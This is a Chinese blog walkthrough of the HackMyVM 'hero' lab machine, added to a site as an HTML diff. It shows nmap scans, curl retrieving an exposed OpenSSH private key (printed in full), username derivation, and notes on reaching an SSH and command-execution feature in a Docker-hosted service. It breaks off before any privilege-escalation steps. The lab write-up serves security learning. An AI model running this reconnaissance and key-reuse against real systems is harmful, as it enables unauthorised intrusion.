@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="hack-my-vm:hero  前言  这个靶机，我真是吃了docker的亏了，得好好学docker了 端口扫描  1234567891011kali@kali [~] ➜  nmap -sT -p- --min-rate 1000 192.168.134.122                        [20:28:53]Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;n">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hack-my-vm:hero">
+<meta property="og:url" content="http://example.com/2025/04/18/hack-my-vm-hero/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="hack-my-vm:hero  前言  这个靶机，我真是吃了docker的亏了，得好好学docker了 端口扫描  1234567891011kali@kali [~] ➜  nmap -sT -p- --min-rate 1000 192.168.134.122                        [20:28:53]Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;n">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/04/18/hack-my-vm-hero/1.png">
+<meta property="og:image" content="http://example.com/2025/04/18/hack-my-vm-hero/2.png">
+<meta property="og:image" content="http://example.com/2025/04/18/hack-my-vm-hero/3.png">
+<meta property="og:image" content="http://example.com/2025/04/18/hack-my-vm-hero/4.png">
+<meta property="article:published_time" content="2025-04-18T12:26:12.000Z">
+<meta property="article:modified_time" content="2025-04-18T13:48:31.157Z">
+<meta property="article:author" content="SunRT">
+<meta property="article:tag" content="HACK-MY-VM">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/04/18/hack-my-vm-hero/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>hack-my-vm:hero</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">VHub</a></li>
+         
+          <li><a href="/tags/WEB-%E5%AE%89%E5%85%A8">WEB-安全</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2025/04/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE6/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/18/hack-my-vm-hero/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/18/hack-my-vm-hero/&text=hack-my-vm:hero"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/18/hack-my-vm-hero/&title=hack-my-vm:hero"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/18/hack-my-vm-hero/&is_video=false&description=hack-my-vm:hero"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hack-my-vm:hero&body=Check out this article: http://example.com/2025/04/18/hack-my-vm-hero/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/18/hack-my-vm-hero/&title=hack-my-vm:hero"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/18/hack-my-vm-hero/&title=hack-my-vm:hero"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/18/hack-my-vm-hero/&title=hack-my-vm:hero"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/18/hack-my-vm-hero/&title=hack-my-vm:hero"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/18/hack-my-vm-hero/&name=hack-my-vm:hero&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/18/hack-my-vm-hero/&t=hack-my-vm:hero"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">hack-my-vm:hero</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">服务渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        hack-my-vm:hero
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-18T12:26:12.000Z" itemprop="datePublished">2025-04-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/HACK-MY-VM/" rel="tag">HACK-MY-VM</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">hack-my-vm:hero</h1>
+
+<h2>前言</h2>
+
+<p><strong>这个靶机，我真是吃了docker的亏了，得好好学docker了</strong></p>
+<h2>端口扫描</h2>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  nmap -sT -p- --min-rate 1000 192.168.134.122                        [20:28:53]</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 20:29 CST</span><br><span class="line">Nmap scan report for 192.168.134.122</span><br><span class="line">Host is up (0.023s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">5678/tcp open  rrac</span><br><span class="line">MAC Address: 08:00:27:32:A0:79 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.06 seconds</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  nmap -sT -sC -sV -O -p80,5678 192.168.134.122                       [20:29:28]</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 20:30 CST</span><br><span class="line">Nmap scan report for 192.168.134.122</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    nginx</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">5678/tcp open  rrac?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Accept-Ranges: bytes</span><br><span class="line">|     Cache-Control: public, max-age=86400</span><br><span class="line">|     Last-Modified: Fri, 18 Apr 2025 10:48:24 GMT</span><br><span class="line">|     ETag: W/&quot;7b7-196488390e7&quot;</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     Content-Length: 1975</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Date: Fri, 18 Apr 2025 12:30:32 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     <span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line">|     <span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">|     <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">|     <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">crossorigin</span> <span class="attr">src</span>=<span class="string">&quot;/assets/polyfills-DfOJfMlf.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">|     <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">|     <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span></span><br><span class="line">|     <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">|     <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/favicon.ico&quot;</span> /&gt;</span></span><br><span class="line">|     <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="keyword">@media</span> (<span class="attribute">prefers-color-scheme</span>: dark) &#123; <span class="selector-tag">body</span> &#123; <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">45</span>, <span class="number">46</span>, <span class="number">46</span>) &#125; &#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">|     <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">|     <span class="variable language_">window</span>.<span class="property">BASE_PATH</span> = <span class="string">&#x27;/&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">|     <span class="variable language_">window</span>.<span class="property">REST_ENDPOINT</span> = <span class="string">&#x27;rest&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">|     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">|     <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/rest/sentry.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">|     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">!function(t,e)&#123;var o,n,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|   HTTPOptions, RTSPRequest:</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     HTTP/1.1 404 Not Found</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     Content-Security-Policy: default-src &#x27;none&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     X-Content-Type-Options: nosniff</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     Content-Type: text/html; charset=utf-8</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     Content-Length: 143</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     Vary: Accept-Encoding</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     Date: Fri, 18 Apr 2025 12:30:33 GMT</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     Connection: close</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     <span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     <span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     <span class="tag">&lt;<span class="name">title</span>&gt;</span>Error<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     <span class="tag">&lt;<span class="name">pre</span>&gt;</span>Cannot OPTIONS /<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|     <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">|_    <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF-Port5678-TCP:V=7.94SVN%I=7%D=4/18%Time=680245E9%P=x86_64-pc-linux-gnu%r</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:(GetRequest,8DC,&quot;HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nC</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:ache-Control:\x20public,\x20max-age=86400\r\nLast-Modified:\x20Fri,\x20</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:18\x20Apr\x202025\x2010:48:24\x20GMT\r\nETag:\x20W/\&quot;7b7-196488390e7\&quot;\</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x201</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:975\r\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2018\x20Apr\x202025\x</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:2012:30:32\x20GMT\r\nConnection:\x20close\r\n\r\n<span class="meta">&lt;!DOCTYPE\x20html&gt;</span>\n<span class="tag">&lt;<span class="name">h</span></span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars"><span class="attr">SF:tml</span>\<span class="attr">x20lang</span>=<span class="string">\</span>&quot;<span class="attr">en</span>\&quot;&gt;</span>\n\t<span class="tag">&lt;<span class="name">head</span>&gt;</span>\n\t\t&lt;script\x20type=\&quot;module\&quot;\x20crosso</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:rigin\x20src=\&quot;/assets/polyfills-DfOJfMlf\.js\&quot;&gt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>\n\n\t\t&lt;meta\</span><br><span class="line">SF:x20charset=\&quot;utf-8\&quot;\x20/&gt;\n\t\t&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;</span><br><span class="line">SF:\x20content=\&quot;IE=edge\&quot;\x20/&gt;\n\t\t&lt;meta\x20name=\&quot;viewport\&quot;\x20conten</span><br><span class="line">SF:t=\&quot;width=device-width,initial-scale=1\.0\&quot;\x20/&gt;\n\t\t&lt;link\x20rel=\&quot;i</span><br><span class="line">SF:con\&quot;\x20href=\&quot;/favicon\.ico\&quot;\x20/&gt;\n\t\t<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="keyword">@media</span>\x20\(prefers-c</span></span><br><span class="line"><span class="language-css"><span class="attribute">SF</span>:<span class="attribute">olor-scheme</span>:\x20dark\)\x20&#123;\x20body\x20&#123;\x20background-<span class="attribute">color</span>:\x20rgb\(<span class="number">4</span></span></span><br><span class="line"><span class="language-css">SF:<span class="number">5</span>,\x2046,\x2046\)\x20&#125;\x20&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>\n\t\t&lt;script\x20type=\&quot;text/javascr</span><br><span class="line">SF:ipt\&quot;&gt;\n\t\t\twindow\.BASE_PATH\x20=\x20&#x27;/&#x27;;\n\t\t\twindow\.REST_ENDPOI</span><br><span class="line">SF:NT\x20=\x20&#x27;rest&#x27;;\n\t\t<span class="tag">&lt;/<span class="name">script</span>&gt;</span>\n\t\t&lt;script\x20src=\&quot;/rest/sentry\.j</span><br><span class="line">SF:s\&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>\n\t\t<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">!function\(t,e\)&#123;var\x20o,n,&quot;)%r(HTTPOptions</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:,183,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20d</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:efault-src\x20&#x27;none&#x27;\r\nX-Content-Type-Options:\x20nosniff\r\nContent-T</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:ype:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nVary:\</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:x20Accept-Encoding\r\nDate:\x20Fri,\x2018\x20Apr\x202025\x2012:30:33\x2</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:0GMT\r\nConnection:\x20close\r\n\r\n<span class="meta">&lt;!DOCTYPE\x20html&gt;</span>\n&lt;html\x20lang=\</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:&quot;en\&quot;&gt;\n<span class="tag">&lt;<span class="name">head</span>&gt;</span>\n&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n<span class="tag">&lt;<span class="name">title</span>&gt;</span>Error<span class="tag">&lt;/<span class="name">title</span>&gt;</span>\n&lt;/he</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:ad&gt;\n<span class="tag">&lt;<span class="name">body</span>&gt;</span>\n<span class="tag">&lt;<span class="name">pre</span>&gt;</span>Cannot\x20OPTIONS\x20/<span class="tag">&lt;/<span class="name">pre</span>&gt;</span>\n<span class="tag">&lt;/<span class="name">body</span>&gt;</span>\n<span class="tag">&lt;/<span class="name">html</span>&gt;</span>\n&quot;)%r(</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:RTSPRequest,183,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-P</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:olicy:\x20default-src\x20&#x27;none&#x27;\r\nX-Content-Type-Options:\x20nosniff\r</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2014</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:3\r\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2018\x20Apr\x202025\x20</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:12:30:33\x20GMT\r\nConnection:\x20close\r\n\r\n<span class="meta">&lt;!DOCTYPE\x20html&gt;</span>\n<span class="tag">&lt;<span class="name">htm</span></span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars"><span class="attr">SF:l</span>\<span class="attr">x20lang</span>=<span class="string">\</span>&quot;<span class="attr">en</span>\&quot;&gt;</span>\n<span class="tag">&lt;<span class="name">head</span>&gt;</span>\n&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n<span class="tag">&lt;<span class="name">title</span>&gt;</span>Error&lt;/t</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:itle&gt;\n<span class="tag">&lt;/<span class="name">head</span>&gt;</span>\n<span class="tag">&lt;<span class="name">body</span>&gt;</span>\n<span class="tag">&lt;<span class="name">pre</span>&gt;</span>Cannot\x20OPTIONS\x20/<span class="tag">&lt;/<span class="name">pre</span>&gt;</span>\n<span class="tag">&lt;/<span class="name">body</span>&gt;</span>\n&lt;/h</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">SF:tml&gt;\n&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">MAC Address: 08:00:27:32:A0:79 (Oracle VirtualBox virtual NIC)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Device type: general purpose</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Running: Linux 4.X|5.X</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">OS details: Linux 4.15 - 5.8</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Network Distance: 1 hop</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Nmap done: 1 IP address (1 host up) scanned in 13.57 seconds</span></span></span><br></pre></td></tr></table></figure>
+
+<h2>服务渗透</h2>
+
+<p><strong>没开ssh，肯定是反弹shell了，两个看nmap回显的结果，估计都是web页面</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  curl http://192.168.134.122                                         [20:30:34]</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L</span><br><span class="line">UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg</span><br><span class="line">AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75</span><br><span class="line">BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p><strong>这私钥一看就没密码，我们拿去解一下</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  ssh-keygen -y -f id_rsa_hero                                        [20:33:15]</span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKiYY31x+ZMvvHfmGWC7ZE75BbdbAKYEtIX75k6CL27C shawa@hero</span><br></pre></td></tr></table></figure>
+
+<p><strong>拿到一个用户名，估计80端口的收获就止步于此了，我们去看5678端口</strong></p>
+<p><img src="/2025/04/18/hack-my-vm-hero/1.png" alt="1"></p>
+<p><strong>搜了一下项目名，发现是个开源项目，github官方给的就是docker运行，端口5678，所以这就不用想，肯定是docker运行的</strong></p>
+<p><strong>由于拿到了私钥，我就看这个项目有没有ssh相关的</strong></p>
+<p><img src="/2025/04/18/hack-my-vm-hero/2.png" alt="2"></p>
+<p><strong>发现之后，就是常规的连接，但是我死活连接不上奥，我用的localhost和127.0.0.1，我想的是22端口没对外开放，这个肯定能连上，但是连不上，直接炸了，后来知道docker要访问宿主机得访问特定ip172.17.0.1，这个是默认的，用这个就连接成功了</strong></p>
+<p><strong>我当时没成功，找到了命令执行的地方</strong></p>
+<p><img src="/2025/04/18/hack-my-vm-hero/3.png" alt="3"></p>
